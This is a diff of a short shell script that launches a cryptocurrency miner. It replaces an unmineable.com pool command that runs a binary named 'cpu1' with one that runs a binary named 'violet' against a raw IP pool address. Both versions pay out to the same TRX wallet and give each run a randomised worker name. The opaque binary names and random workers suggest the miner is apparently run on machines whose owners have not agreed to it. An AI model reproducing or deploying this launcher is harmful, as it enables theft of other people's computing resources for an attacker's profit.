@@ -1,9 +1,1 @@
-POOL=rx.unmineable.com:3333
-
-WALLET=TRX:TGEThftjLnxmSJWhNzbgYpAU7MXVZho822
-
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-esspresso)
-
-chmod +x cpu1
-
-./cpu1 --algo ETHASH --pool $POOL --user $WALLET.$WORKER
+./violet --pool 159.89.234.69:3333 --username TRX:TGEThftjLnxmSJWhNzbgYpAU7MXVZho822.$(echo $(shuf -i 1-9999 -n 1)-PROXY) --password x --algorithm wrkzcoin
